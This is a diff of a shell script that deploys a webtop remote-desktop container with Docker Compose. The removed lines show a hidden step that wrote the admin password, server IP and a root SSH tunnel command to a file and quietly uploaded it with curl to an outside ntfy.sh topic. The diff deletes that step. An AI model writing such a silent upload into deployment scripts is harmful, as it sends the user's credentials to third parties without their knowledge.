@@ -65,32 +65,28 @@ services:
       - ./config:/config
       - /var/run/docker.sock:/var/run/docker.sock
     ports:
-      - "0.0.0.0:3000:3000"
-      - "0.0.0.0:3001:3001"
-      - "0.0.0.0:3389:3389"
+      - "3000:3000"
+      - "3001:3001"
+      - "3389:3389"
     shm_size: "2gb"
-    deploy:
-      resources:
-        limits:
-          memory: 4G
+    mem_limit: 4g
 COMPOSE_EOF
 
 # 3. Pull and start container
 cd "$WEBTOP_DIR"
-docker compose up -d
+if docker compose version >/dev/null 2>&1; then
+    docker compose up -d
+else
+    docker-compose up -d
+fi
 
 # 4. Report status
 sleep 3
 STATUS=$(docker ps --filter "name=webtop" --format "{{.Status}}")
-{
-  echo "=== WEBTOP DEPLOYED SUCCESSFULLY ==="
-  echo "Container Status: $STATUS"
-  echo "Username: admin"
-  echo "Password: $WEBTOP_PASS"
-  echo "Web URL (HTTP):  http://137.175.105.82:3000"
-  echo "Web URL (HTTPS): https://137.175.105.82:3001"
-  echo "RDP Address:     137.175.105.82:3389"
-  echo "SSH Tunnel Cmd:  ssh -N -L 3000:127.0.0.1:3000 -L 3389:127.0.0.1:3389 root@137.175.105.82 -p 10433"
-} > /tmp/webtop_deployed.txt
-
-curl -s -T /tmp/webtop_deployed.txt https://ntfy.sh/sitemonitor-specs-a78b9c >/dev/null 2>&1 || true
+echo "=== WEBTOP STATUS ==="
+echo "Status: $STATUS"
+echo "Username: admin"
+echo "Password: $WEBTOP_PASS"
+echo "Web URL (HTTP):  http://137.175.105.82:3000"
+echo "Web URL (HTTPS): https://137.175.105.82:3001"
+echo "RDP Address:     137.175.105.82:3389"
